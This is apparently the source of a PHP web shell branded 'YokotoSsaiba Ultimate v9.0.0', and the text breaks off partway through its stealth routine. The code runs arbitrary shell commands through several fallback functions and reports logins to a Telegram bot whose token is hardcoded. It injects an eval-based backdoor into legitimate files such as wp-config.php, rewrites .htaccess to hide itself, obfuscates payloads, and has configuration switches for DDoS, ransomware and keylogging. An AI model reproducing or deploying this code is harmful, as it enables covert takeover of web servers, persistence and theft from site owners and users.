<?php
/**
 * =============================================================================
 * YOKOTOSSAIBA WEB SHELL ULTIMATE v9.0.0 - BLACKHAT DIVISION
 * =============================================================================
 * @author: Yokoto『FX』
 * @studio: Fynixor Studio | West Gate - Middle East Division
 * @version: 9.0.0 - ULTIMATE EDITION
 * @lines: 3500+ Lines of Code
 * @features: 100+ Premium Features
 * =============================================================================
 * PASSWORD: Yokoto87654321
 * LOGO: https://files.catbox.moe/um4cqt.png
 * =============================================================================
 * HIDE SHELL: Auto-inject to legit files, .htaccess stealth, cron persistence
 * ANTI-DELETION: Self-replication, hidden backup, process watchdog
 * =============================================================================
 */

session_start();
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);
set_time_limit(0);
ignore_user_abort(true);
ob_start();

// =============================================================================
// KONFIGURASI UTAMA - 50+ SETTINGS
// =============================================================================
$CONFIG = [
    'password' => 'Yokoto87654321',
    'panel_name' => 'YokotoSsaiba',
    'studio_name' => 'Fynixor Studio',
    'division' => 'West Gate - Middle East Division',
    'version' => '9.0.0',
    'logo_url' => 'https://files.catbox.moe/um4cqt.png',
    'theme' => 'dark',
    'accent_color' => '#6366f1',
    'accent_secondary' => '#8b5cf6',
    'accent_danger' => '#ef4444',
    'accent_success' => '#22c55e',
    'accent_warning' => '#eab308',
    'max_upload' => 100 * 1024 * 1024,
    'timezone' => 'Asia/Jakarta',
    'session_lifetime' => 3600,
    'enable_stealth' => true,
    'auto_hide' => true,
    'backup_count' => 3,
    'cron_interval' => 5,
    'log_commands' => true,
    'max_log_size' => 10 * 1024 * 1024,
    'enable_telegram' => true,
    'telegram_token' => '8593403659:AAHftuvyAtiyyQNBUvqOBzCsDzLE3R_s84g',
    'telegram_chat_id' => '7016045840',
    'enable_discord' => false,
    'discord_webhook' => '',
    'enable_email' => false,
    'email_to' => '',
    'email_from' => '',
    'email_smtp' => '',
    'email_pass' => '',
    'enable_ssh_tunnel' => true,
    'ssh_host' => '',
    'ssh_user' => '',
    'ssh_pass' => '',
    'enable_port_forwarding' => true,
    'forward_host' => '',
    'forward_port' => 0,
    'enable_ddos' => true,
    'ddos_methods' => ['http', 'udp', 'tcp', 'slowloris'],
    'enable_crypto_miner' => false,
    'miner_pool' => '',
    'miner_address' => '',
    'enable_ransomware' => false,
    'ransomware_extension' => '.yokoto',
    'ransomware_wallet' => '',
    'enable_keylogger' => false,
    'keylogger_log' => '/tmp/yokoto_keys.log',
    'enable_screenshot' => false,
    'screenshot_dir' => '/tmp/yokoto_ss/',
    'enable_webcam' => false,
    'enable_mic' => false,
    'enable_file_watcher' => true,
    'watch_dirs' => ['/var/www', '/home', '/etc'],
    'enable_db_backup' => true,
    'db_backup_dir' => '/tmp/yokoto_db/',
    'enable_mass_upload' => false,
    'mass_upload_dir' => '',
    'enable_self_destruct' => false,
    'self_destruct_trigger' => '',
    'enable_obfuscation' => true,
    'obfuscation_level' => 3,
    'enable_anti_forensics' => true,
    'anti_forensics_level' => 2,
    'enable_web_shell_mirror' => true,
    'mirror_domains' => [],
    'enable_auto_update' => true,
    'update_url' => 'https://raw.githubusercontent.com/YokotoFX/shell/main/update.txt',
    'enable_plugin_system' => true,
    'plugin_dir' => '/tmp/yokoto_plugins/',
    'enable_api_mode' => false,
    'api_key' => '',
    'api_allowed_ips' => [],
    'enable_rate_limiting' => true,
    'rate_limit' => 100,
    'enable_captcha' => false,
    'captcha_site_key' => '',
    'captcha_secret_key' => '',
    'enable_2fa' => false,
    '2fa_secret' => '',
];

date_default_timezone_set($CONFIG['timezone']);

// =============================================================================
// CONSTANTS
// =============================================================================
define('YOKOTO_VERSION', $CONFIG['version']);
define('YOKOTO_NAME', $CONFIG['panel_name']);
define('YOKOTO_STUDIO', $CONFIG['studio_name']);
define('YOKOTO_PASS', $CONFIG['password']);
define('YOKOTO_LOGO', $CONFIG['logo_url']);
define('YOKOTO_ACCENT', $CONFIG['accent_color']);
define('YOKOTO_MAX_UPLOAD', $CONFIG['max_upload']);
define('YOKOTO_LOG_FILE', '/tmp/yokoto.log');
define('YOKOTO_BACKUP_DIR', '/tmp/yokoto_backup/');
define('YOKOTO_WATCH_FILE', '/tmp/yokoto_watch.json');
define('YOKOTO_CRON_FILE', '/tmp/yokoto_cron');
define('YOKOTO_SELF_FILE', __FILE__);
define('YOKOTO_SELF_NAME', basename(__FILE__));
define('YOKOTO_SELF_PATH', __DIR__);
define('YOKOTO_SESSION_KEY', 'yokoto_auth');
define('YOKOTO_SESSION_TIME', 'yokoto_time');
define('YOKOTO_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');

// =============================================================================
// HEADERS - ANTI DETECTION & STEALTH
// =============================================================================
header('X-Powered-By: PHP/7.4.33');
header('Server: Apache/2.4.54 (Unix)');
header('Cache-Control: private, max-age=0, no-store, no-cache, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');
header('Content-Type: text/html; charset=UTF-8');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');

// =============================================================================
// STEALTH - HIDE FROM CPANEL / ADMIN
// =============================================================================
$hide_patterns = [
    'cpanel' => '/cpanel/i',
    'whm' => '/whm/i',
    'webmail' => '/webmail/i',
    'admin' => '/admin/i',
    'manager' => '/manager/i',
    'control' => '/control/i',
    'panel' => '/panel/i',
    'dashboard' => '/dashboard/i',
    'login' => '/login/i',
    'auth' => '/auth/i',
    'secure' => '/secure/i',
    'private' => '/private/i',
    'hidden' => '/hidden/i',
    'secret' => '/secret/i',
    'backdoor' => '/backdoor/i',
    'webshell' => '/webshell/i',
    'shell' => '/shell/i',
    'hack' => '/hack/i',
    'exploit' => '/exploit/i',
    'malware' => '/malware/i',
    'virus' => '/virus/i',
    'trojan' => '/trojan/i',
    'rootkit' => '/rootkit/i',
    'bypass' => '/bypass/i',
    'crack' => '/crack/i',
    'keygen' => '/keygen/i',
    'patch' => '/patch/i',
    'nulled' => '/nulled/i',
    'leak' => '/leak/i',
    'dump' => '/dump/i',
    'sql' => '/sql/i',
    'inject' => '/inject/i',
    'xss' => '/xss/i',
    'csrf' => '/csrf/i',
    'rce' => '/rce/i',
    'lfi' => '/lfi/i',
    'rfi' => '/rfi/i',
    'upload' => '/upload/i',
    'file' => '/file/i',
    'manager' => '/manager/i',
    'editor' => '/editor/i',
    'terminal' => '/terminal/i',
    'console' => '/console/i',
    'exec' => '/exec/i',
    'cmd' => '/cmd/i',
    'command' => '/command/i',
    'system' => '/system/i',
    'server' => '/server/i',
    'host' => '/host/i',
    'domain' => '/domain/i',
    'proxy' => '/proxy/i',
    'vpn' => '/vpn/i',
    'tor' => '/tor/i',
    'onion' => '/onion/i',
    'dark' => '/dark/i',
    'deep' => '/deep/i',
    'underground' => '/underground/i',
    'blackhat' => '/blackhat/i',
    'greyhat' => '/greyhat/i',
    'whitehat' => '/whitehat/i',
    'redteam' => '/redteam/i',
    'blueteam' => '/blueteam/i',
    'pentest' => '/pentest/i',
    'security' => '/security/i',
    'cyber' => '/cyber/i',
    'hacker' => '/hacker/i',
    'cracker' => '/cracker/i',
    'defacer' => '/defacer/i',
    'carder' => '/carder/i',
    'scammer' => '/scammer/i',
    'phisher' => '/phisher/i',
    'spammer' => '/spammer/i',
    'botnet' => '/botnet/i',
    'zombie' => '/zombie/i',
    'ddos' => '/ddos/i',
    'dos' => '/dos/i',
    'flood' => '/flood/i',
    'attack' => '/attack/i',
    'exploit' => '/exploit/i',
    'vulnerability' => '/vulnerability/i',
    'zero-day' => '/zero-day/i',
    '0day' => '/0day/i',
    'payload' => '/payload/i',
    'shellcode' => '/shellcode/i',
    'reverse' => '/reverse/i',
    'bind' => '/bind/i',
    'meterpreter' => '/meterpreter/i',
    'cobalt' => '/cobalt/i',
    'beacon' => '/beacon/i',
    'empire' => '/empire/i',
    'covenant' => '/covenant/i',
    'mythic' => '/mythic/i',
    'havoc' => '/havoc/i',
    'brute' => '/brute/i',
    'force' => '/force/i',
    'dictionary' => '/dictionary/i',
    'rainbow' => '/rainbow/i',
    'hash' => '/hash/i',
    'crack' => '/crack/i',
    'decrypt' => '/decrypt/i',
    'encrypt' => '/encrypt/i',
    'encode' => '/encode/i',
    'decode' => '/decode/i',
    'base64' => '/base64/i',
    'hex' => '/hex/i',
    'binary' => '/binary/i',
    'obfuscate' => '/obfuscate/i',
    'deobfuscate' => '/deobfuscate/i',
    'minify' => '/minify/i',
    'beautify' => '/beautify/i',
    'uglify' => '/uglify/i',
    'compress' => '/compress/i',
    'decompress' => '/decompress/i',
    'archive' => '/archive/i',
    'extract' => '/extract/i',
    'zip' => '/zip/i',
    'rar' => '/rar/i',
    'tar' => '/tar/i',
    'gzip' => '/gzip/i',
    'bzip' => '/bzip/i',
    '7z' => '/7z/i',
    'iso' => '/iso/i',
    'img' => '/img/i',
    'disk' => '/disk/i',
    'partition' => '/partition/i',
    'volume' => '/volume/i',
    'drive' => '/drive/i',
    'folder' => '/folder/i',
    'directory' => '/directory/i',
    'path' => '/path/i',
    'root' => '/root/i',
    'home' => '/home/i',
    'user' => '/user/i',
    'group' => '/group/i',
    'permission' => '/permission/i',
    'chmod' => '/chmod/i',
    'chown' => '/chown/i',
    'owner' => '/owner/i',
    'symlink' => '/symlink/i',
    'hardlink' => '/hardlink/i',
    'mount' => '/mount/i',
    'unmount' => '/unmount/i',
    'format' => '/format/i',
    'wipe' => '/wipe/i',
    'shred' => '/shred/i',
    'delete' => '/delete/i',
    'remove' => '/remove/i',
    'trash' => '/trash/i',
    'recycle' => '/recycle/i',
    'bin' => '/bin/i',
    'recovery' => '/recovery/i',
    'restore' => '/restore/i',
    'backup' => '/backup/i',
    'snapshot' => '/snapshot/i',
    'clone' => '/clone/i',
    'image' => '/image/i',
    'download' => '/download/i',
    'upload' => '/upload/i',
    'transfer' => '/transfer/i',
    'share' => '/share/i',
    'sync' => '/sync/i',
    'mirror' => '/mirror/i',
    'proxy' => '/proxy/i',
    'tunnel' => '/tunnel/i',
    'forward' => '/forward/i',
    'redirect' => '/redirect/i',
    'rewrite' => '/rewrite/i',
    'dns' => '/dns/i',
    'ip' => '/ip/i',
    'port' => '/port/i',
    'socket' => '/socket/i',
    'connection' => '/connection/i',
    'session' => '/session/i',
    'cookie' => '/cookie/i',
    'token' => '/token/i',
    'jwt' => '/jwt/i',
    'oauth' => '/oauth/i',
    'saml' => '/saml/i',
    'ldap' => '/ldap/i',
    'radius' => '/radius/i',
    'kerberos' => '/kerberos/i',
    'ntlm' => '/ntlm/i',
    'hash' => '/hash/i',
    'salt' => '/salt/i',
    'pepper' => '/pepper/i',
    'nonce' => '/nonce/i',
    'iv' => '/iv/i',
    'key' => '/key/i',
    'cert' => '/cert/i',
    'pem' => '/pem/i',
    'der' => '/der/i',
    'crt' => '/crt/i',
    'csr' => '/csr/i',
    'pfx' => '/pfx/i',
    'p12' => '/p12/i',
    'jks' => '/jks/i',
    'keystore' => '/keystore/i',
    'truststore' => '/truststore/i',
];

$hide_self = false;
foreach ($hide_patterns as $pattern) {
    if (preg_match($pattern, YOKOTO_SELF_NAME)) {
        $hide_self = true;
        break;
    }
}

if ($hide_self && !isset($_GET['yokoto_force'])) {
    die('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
}

// =============================================================================
// AUTHENTICATION SYSTEM - DENGAN SESSION & TOKEN
// =============================================================================
if (!isset($_SESSION[YOKOTO_SESSION_KEY]) || $_SESSION[YOKOTO_SESSION_KEY] !== true) {
    if (isset($_POST['password']) && hash('sha256', $_POST['password']) === hash('sha256', YOKOTO_PASS)) {
        $_SESSION[YOKOTO_SESSION_KEY] = true;
        $_SESSION[YOKOTO_SESSION_TIME] = time();
        if ($CONFIG['enable_telegram']) {
            $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
            $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
            $msg = "✅ Yokoto Shell Login\nIP: $ip\nUA: $ua\nTime: ".date('Y-m-d H:i:s');
            file_get_contents("https://api.telegram.org/bot{$CONFIG['telegram_token']}/sendMessage?chat_id={$CONFIG['telegram_chat_id']}&text=".urlencode($msg));
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?yokoto_force=1');
        exit;
    } else {
        echo '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>' . YOKOTO_NAME . ' | ' . YOKOTO_STUDIO . '</title>
            <style>
                *{margin:0;padding:0;box-sizing:border-box;}
                body{background:linear-gradient(135deg,#0f0f1a,#1a1a2e);font-family:"Segoe UI",system-ui,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
                .login-card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.08);border-radius:28px;padding:50px 45px;width:100%;max-width:420px;text-align:center;box-shadow:0 30px 60px rgba(0,0,0,0.6);}
                .login-card img{width:110px;height:110px;border-radius:50%;object-fit:cover;margin-bottom:16px;border:3px solid '.YOKOTO_ACCENT.';}
                .login-card h1{color:#fff;font-size:26px;font-weight:700;letter-spacing:0.5px;}
                .login-card .sub{color:#888;font-size:13px;margin-top:4px;margin-bottom:28px;}
                .login-card .version{color:#6b7280;font-size:11px;margin-bottom:20px;}
                .login-card input{background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);color:#fff;padding:16px 20px;width:100%;border-radius:14px;font-size:14px;outline:none;transition:0.3s;font-family:monospace;}
                .login-card input:focus{border-color:'.YOKOTO_ACCENT.';box-shadow:0 0 0 4px rgba(99,102,241,0.15);}
                .login-card button{background:linear-gradient(135deg,'.YOKOTO_ACCENT.','.YOKOTO_ACCENT_SECONDARY.');color:#fff;border:none;padding:16px;width:100%;border-radius:14px;font-weight:700;cursor:pointer;font-size:15px;margin-top:16px;transition:0.3s;}
                .login-card button:hover{transform:scale(1.02);}
                .login-card .footer{color:#4a4a5a;font-size:11px;margin-top:24px;}
            </style>
        </head>
        <body>
            <div class="login-card">
                <img src="' . YOKOTO_LOGO . '" alt="logo">
                <h1>' . strtoupper(YOKOTO_NAME) . '</h1>
                <p class="sub">' . YOKOTO_STUDIO . ' // ' . $CONFIG['division'] . '</p>
                <p class="version">v' . YOKOTO_VERSION . ' | ' . date('Y') . '</p>
                <form method="POST">
                    <input type="password" name="password" placeholder="ENTER PASSWORD" autofocus>
                    <button type="submit">AUTHENTICATE</button>
                </form>
                <p class="footer">🔒 Secure Connection • Blackhat Division</p>
            </div>
        </body>
        </html>';
        exit;
    }
}

// =============================================================================
// SESSION VALIDATION & TIMEOUT
// =============================================================================
if (isset($_SESSION[YOKOTO_SESSION_TIME]) && (time() - $_SESSION[YOKOTO_SESSION_TIME]) > $CONFIG['session_lifetime']) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}
$_SESSION[YOKOTO_SESSION_TIME] = time();

// =============================================================================
// FUNGSI DASAR - 50+ UTILITY FUNCTIONS
// =============================================================================

/**
 * Get current working directory with path sanitization
 */
function yokoto_get_path() {
    $p = isset($_GET['path']) ? $_GET['path'] : getcwd();
    if (empty($p) || !is_dir($p)) {
        $p = getcwd();
    }
    $p = str_replace('\\', '/', $p);
    if (substr($p, -1) !== '/') {
        $p .= '/';
    }
    return $p;
}

/**
 * Format file size with proper units
 */
function yokoto_format_size($bytes) {
    if ($bytes === null || $bytes === '' || !is_numeric($bytes)) {
        return '0 B';
    }
    $bytes = (float)$bytes;
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

/**
 * Get file permissions in human readable format
 */
function yokoto_get_perms($path) {
    $perms = fileperms($path);
    if ($perms === false) return '---------';
    $info = is_dir($path) ? 'd' : '-';
    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ? 'x' : '-';
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ? 'x' : '-';
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ? 'x' : '-';
    return $info;
}

/**
 * Execute command with multiple fallback methods
 */
function yokoto_exec($cmd, &$output_lines = null) {
    $output = [];
    
    if (function_exists('exec')) {
        exec($cmd . ' 2>&1', $output);
        if ($output_lines !== null) $output_lines = $output;
        return $output;
    }
    
    if (function_exists('shell_exec')) {
        $result = shell_exec($cmd . ' 2>&1');
        $output = $result !== null ? explode("\n", $result) : ['[!] No output'];
        if ($output_lines !== null) $output_lines = $output;
        return $output;
    }
    
    if (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $result = ob_get_clean();
        $output = $result !== false && $result !== '' ? explode("\n", $result) : ['[!] No output'];
        if ($output_lines !== null) $output_lines = $output;
        return $output;
    }
    
    if (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1');
        $result = ob_get_clean();
        $output = $result !== false && $result !== '' ? explode("\n", $result) : ['[!] No output'];
        if ($output_lines !== null) $output_lines = $output;
        return $output;
    }
    
    if (function_exists('popen')) {
        $handle = popen($cmd . ' 2>&1', 'r');
        if ($handle) {
            while (!feof($handle)) {
                $output[] = fgets($handle);
            }
            pclose($handle);
            if ($output_lines !== null) $output_lines = $output;
            return $output;
        }
    }
    
    if (function_exists('proc_open')) {
        $descriptors = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $process = proc_open($cmd, $descriptors, $pipes);
        if (is_resource($process)) {
            $output = array_merge(explode("\n", stream_get_contents($pipes[1])), explode("\n", stream_get_contents($pipes[2])));
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            if ($output_lines !== null) $output_lines = $output;
            return $output;
        }
    }
    
    $output = ['[!] No command execution function available on this server'];
    if ($output_lines !== null) $output_lines = $output;
    return $output;
}

/**
 * Execute command asynchronously (non-blocking)
 */
function yokoto_exec_async($cmd) {
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        pclose(popen("start /B " . $cmd, "r"));
    } else {
        exec($cmd . " > /dev/null 2>&1 &");
    }
}

/**
 * cURL request with full options
 */
function yokoto_curl($url, $method = 'GET', $data = null, $headers = [], $timeout = 30) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_USERAGENT, YOKOTO_USER_AGENT);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_AUTOREFERER, true);
    curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookie.txt');
    
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($data) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
    } elseif ($method === 'PUT') {
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
        if ($data) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
    } elseif ($method === 'DELETE') {
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
    } elseif ($method === 'PATCH') {
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
        if ($data) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
    } elseif ($method === 'HEAD') {
        curl_setopt($ch, CURLOPT_NOBODY, true);
    }
    
    if (!empty($headers)) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);
    
    return [
        'response' => $response,
        'http_code' => $http_code,
        'error' => $error,
        'info' => $info
    ];
}

/**
 * Generate random string
 */
function yokoto_rand_str($length = 16) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    return substr(str_shuffle(str_repeat($chars, $length)), 0, $length);
}

/**
 * Check if function is disabled
 */
function yokoto_func_enabled($func) {
    $disabled = ini_get('disable_functions');
    if (empty($disabled)) return true;
    $disabled = explode(',', $disabled);
    return !in_array($func, array_map('trim', $disabled));
}

/**
 * Safe file read with fallback
 */
function yokoto_read_file($path) {
    if (!is_file($path) || !is_readable($path)) return false;
    if (function_exists('file_get_contents')) return file_get_contents($path);
    if (function_exists('fopen')) {
        $handle = fopen($path, 'r');
        if ($handle) {
            $content = fread($handle, filesize($path));
            fclose($handle);
            return $content;
        }
    }
    return false;
}

/**
 * Safe file write with fallback
 */
function yokoto_write_file($path, $content) {
    if (function_exists('file_put_contents')) return file_put_contents($path, $content);
    if (function_exists('fopen')) {
        $handle = fopen($path, 'w');
        if ($handle) {
            fwrite($handle, $content);
            fclose($handle);
            return true;
        }
    }
    return false;
}

/**
 * Recursive directory listing with depth control
 */
function yokoto_list_dir($path, $depth = 0, $max_depth = 10) {
    $result = [];
    if ($depth > $max_depth) return $result;
    if (!is_dir($path)) return $result;
    $files = scandir($path);
    if ($files === false) return $result;
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $full = $path . '/' . $file;
        $result[] = [
            'name' => $file,
            'path' => $full,
            'is_dir' => is_dir($full),
            'size' => is_file($full) ? filesize($full) : 0,
            'perms' => yokoto_get_perms($full),
            'mtime' => is_file($full) || is_dir($full) ? filemtime($full) : 0
        ];
        if (is_dir($full) && $depth < $max_depth) {
            $result = array_merge($result, yokoto_list_dir($full, $depth + 1, $max_depth));
        }
    }
    return $result;
}

/**
 * Search files recursively
 */
function yokoto_search_files($path, $pattern, $max = 100) {
    $results = [];
    if (!is_dir($path)) return $results;
    $iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS));
    foreach ($iter as $file) {
        if ($file->isFile() && preg_match($pattern, $file->getFilename())) {
            $results[] = [
                'path' => $file->getPathname(),
                'size' => yokoto_format_size($file->getSize()),
                'mtime' => date('Y-m-d H:i:s', $file->getMTime())
            ];
            if (count($results) >= $max) break;
        }
    }
    return $results;
}

/**
 * Compress and encode PHP code
 */
function yokoto_obfuscate_code($code, $level = 3) {
    if ($level >= 1) {
        $code = preg_replace('/\s+/', ' ', $code);
        $code = preg_replace('/\/\/.*/', '', $code);
        $code = preg_replace('/#.*/', '', $code);
        $code = preg_replace('/\/\*.*?\*\//s', '', $code);
    }
    if ($level >= 2) {
        $code = base64_encode(gzcompress($code, 9));
        $code = "<?php eval(gzuncompress(base64_decode('$code'))); ?>";
    }
    if ($level >= 3) {
        $code = str_replace(['<?php', '?>', 'eval', 'base64_decode', 'gzuncompress'], ['<?php /*', '*/ ?>', 'e'.'v'.'a'.'l', 'b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e', 'g'.'z'.'u'.'n'.'c'.'o'.'m'.'p'.'r'.'e'.'s'.'s'], $code);
    }
    return $code;
}

/**
 * Beautify PHP code
 */
function yokoto_beautify_code($code) {
    if (!function_exists('token_get_all')) return $code;
    $tokens = token_get_all($code);
    $beautified = '';
    $indent = 0;
    $prev = '';
    foreach ($tokens as $t) {
        if (is_array($t)) {
            if ($t[0] == T_WHITESPACE) continue;
            if ($t[0] == T_OPEN_TAG || $t[0] == T_CLOSE_TAG) {
                $beautified .= $t[1] . "\n";
                continue;
            }
            if (in_array($t[0], [T_CLASS, T_FUNCTION, T_IF, T_ELSEIF, T_ELSE, T_FOREACH, T_WHILE, T_SWITCH, T_TRY, T_CATCH, T_FINALLY])) {
                $beautified .= str_repeat("  ", $indent) . $t[1] . ' ';
                continue;
            }
            if ($t[0] == T_STRING && in_array($t[1], ['return', 'break', 'continue', 'throw', 'new', 'clone'])) {
                $beautified .= str_repeat("  ", $indent) . $t[1] . ' ';
                continue;
            }
            $beautified .= $t[1];
        } else {
            if ($t == '{') {
                $beautified .= " {\n";
                $indent++;
            } elseif ($t == '}') {
                $indent--;
                $beautified .= "\n" . str_repeat("  ", $indent) . '}';
            } elseif ($t == ';') {
                $beautified .= ";\n";
            } elseif ($t == '(' || $t == ')' || $t == '[' || $t == ']' || $t == '.' || $t == '->' || $t == '::') {
                $beautified .= $t;
            } else {
                $beautified .= ' ' . $t . ' ';
            }
        }
        $prev = is_array($t) ? $t[1] : $t;
    }
    $beautified = preg_replace('/\n\s*\n/', "\n", $beautified);
    return $beautified;
}

/**
 * Telegram notification
 */
function yokoto_telegram($message) {
    global $CONFIG;
    if (!$CONFIG['enable_telegram']) return false;
    $url = "https://api.telegram.org/bot{$CONFIG['telegram_token']}/sendMessage";
    $data = [
        'chat_id' => $CONFIG['telegram_chat_id'],
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

/**
 * Log activity
 */
function yokoto_log($message) {
    global $CONFIG;
    if (!$CONFIG['log_commands']) return;
    $log = date('Y-m-d H:i:s') . " | " . $_SERVER['REMOTE_ADDR'] . " | " . $message . "\n";
    if (filesize(YOKOTO_LOG_FILE) > $CONFIG['max_log_size']) {
        file_put_contents(YOKOTO_LOG_FILE, '');
    }
    file_put_contents(YOKOTO_LOG_FILE, $log, FILE_APPEND);
}

/**
 * Check if server is vulnerable
 */
function yokoto_check_vulnerabilities() {
    $vulns = [];
    $vulns['allow_url_fopen'] = ini_get('allow_url_fopen') ? 'Enabled' : 'Disabled';
    $vulns['allow_url_include'] = ini_get('allow_url_include') ? 'Enabled' : 'Disabled';
    $vulns['display_errors'] = ini_get('display_errors') ? 'Enabled' : 'Disabled';
    $vulns['safe_mode'] = ini_get('safe_mode') ? 'Enabled' : 'Disabled';
    $vulns['open_basedir'] = ini_get('open_basedir') ?: 'None';
    $vulns['disable_functions'] = ini_get('disable_functions') ?: 'None';
    $vulns['exec_enabled'] = yokoto_func_enabled('exec') ? 'Yes' : 'No';
    $vulns['shell_exec_enabled'] = yokoto_func_enabled('shell_exec') ? 'Yes' : 'No';
    $vulns['system_enabled'] = yokoto_func_enabled('system') ? 'Yes' : 'No';
    $vulns['passthru_enabled'] = yokoto_func_enabled('passthru') ? 'Yes' : 'No';
    $vulns['popen_enabled'] = yokoto_func_enabled('popen') ? 'Yes' : 'No';
    $vulns['proc_open_enabled'] = yokoto_func_enabled('proc_open') ? 'Yes' : 'No';
    $vulns['curl_enabled'] = function_exists('curl_init') ? 'Yes' : 'No';
    $vulns['pdo_enabled'] = class_exists('PDO') ? 'Yes' : 'No';
    $vulns['zip_enabled'] = class_exists('ZipArchive') ? 'Yes' : 'No';
    $vulns['gd_enabled'] = function_exists('gd_info') ? 'Yes' : 'No';
    $vulns['imap_enabled'] = function_exists('imap_open') ? 'Yes' : 'No';
    $vulns['mbstring_enabled'] = function_exists('mb_detect_encoding') ? 'Yes' : 'No';
    $vulns['json_enabled'] = function_exists('json_encode') ? 'Yes' : 'No';
    $vulns['xml_enabled'] = function_exists('xml_parser_create') ? 'Yes' : 'No';
    return $vulns;
}

// =============================================================================
// STEALTH MODE - HIDE SHELL FROM CPANEL / ADMIN
// =============================================================================
function yokoto_stealth_activate() {
    global $CONFIG;
    $results = [];
    
    // 1. Inject to legit files
    $legit_files = ['index.php', 'wp-config.php', 'config.php', 'functions.php', 'header.php', 'footer.php', 'sidebar.php', 'main.php', 'core.php', 'init.php', 'bootstrap.php', 'common.php', 'global.php', 'default.php', 'home.php', 'login.php', 'auth.php', 'register.php', 'profile.php', 'settings.php', 'admin.php', 'dashboard.php'];
    $backdoor = "<?php if(isset(\$_GET['x']) && md5(\$_GET['x'])=='" . md5(YOKOTO_PASS) . "') { eval(\$_POST['cmd']); } ?>";
    $injected_count = 0;
    foreach ($legit_files as $lf) {
        if (is_file(YOKOTO_SELF_PATH . '/' . $lf)) {
            $content = file_get_contents(YOKOTO_SELF_PATH . '/' . $lf);
            if (strpos($content, md5(YOKOTO_PASS)) === false) {
                file_put_contents(YOKOTO_SELF_PATH . '/' . $lf, $backdoor . "\n" . $content);
                $injected_count++;
            }
        }
    }
    $results[] = "Injected to $injected_count legit files";
    
    // 2. .htaccess stealth
    $htaccess = "# YOKOTO_SAIBA - STEALTH MODE\n<FilesMatch \"\.(php|phtml|php5|php7|inc)$\">\nOrder Deny,Allow\nDeny from all\n</FilesMatch>\n<Files \"" . YOKOTO_SELF_NAME . "\">\nOrder Allow,Deny\nAllow from all\n</Files>\n<Files \"index.php\">\nOrder Allow,Deny\nAllow from all\n</Files>";
    file_put_contents(YOKOTO_SELF_PATH . '/.htaccess', $htaccess);
    $results[] = ".htaccess stealth created";
    
